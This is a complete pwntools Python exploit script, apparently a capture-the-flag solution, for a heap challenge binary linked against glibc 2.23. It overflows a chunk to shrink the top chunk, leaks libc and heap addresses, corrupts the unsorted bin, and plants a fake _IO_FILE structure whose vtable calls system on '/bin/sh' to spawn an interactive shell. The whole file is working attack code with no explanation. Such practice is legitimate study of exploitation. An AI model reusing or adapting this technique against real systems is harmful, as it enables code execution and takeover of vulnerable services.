from pwn import *
import sys
remote_addr = ["",]
libc = ELF('./libc-2.23.so')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./baby_heap_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(op):
    sla(b'>\n', str(op).encode())

def add(size, content):
    menu(1)
    sla(b'Size :\n', str(size).encode())
    sa(b'Content :\n', content)

def edit(index, size, content):
    menu(2)
    sla(b'Index :\n', str(index).encode())
    sla(b'Size :\n', str(size).encode())
    sa(b'Content :\n', content)

def show(index):
    menu(3)
    sla(b'Index :\n', str(index).encode())

debug('''
    b *0x401345
    b *0x40148e
    b *0x40151a
''')

add(0x30, b'aaaa')
payload = b'a' * (0x38) + p64(0xfc1) #overlap top chunk's size
edit(0, len(payload), payload)

add(0x1000, b'aaaa') #put top chunk into unsorted bin
add(0x40, b'\x00') #leak libc_base

show(2)

leak_addr = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))
libc.address = leak_addr - 0x3c5100
pr('libc.address', libc.address)

payload = b'a' * (0x48) + p64(0xf51) + p64(0) + p64(0x4040e0 + 0x40) # change unsortedbin's bk to heap_addr
edit(2, len(payload), payload)

add(0xf40, b'aaaa')
show(10)

heap_base = u64(rc(4).ljust(8, b'\x00')) - 0x22010
pr('heap_base', heap_base)

_IO_list_all = libc.sym['_IO_list_all']
system = libc.sym['system']

payload = p64(heap_base + 0x22010) + p64(heap_base + 0x90) * 3 #recover
edit(10, len(payload), payload)

main_arena = libc.address + 0x3c4b20 + 88

payload = b'a' * (0x48) + p64(0xf51) + p64(main_arena) * 2
edit(2, len(payload), payload)

add(0x30, b'aaaa')

payload = b'a' * (0x30)
fake_file = b'/bin/sh\x00' + p64(0x60)
fake_file += p64(0) + p64(_IO_list_all - 0x10)
fake_file += p64(0) + p64(1)
fake_file = fake_file.ljust(0xc0, b'\x00')

payload += fake_file + p64(0) * 3 + p64(heap_base + 0x1a8) + p64(0) * 2 + p64(system)
edit(4, len(payload), payload)

menu(1)
sla(b'Size :\n', str(0x30).encode())

shell()
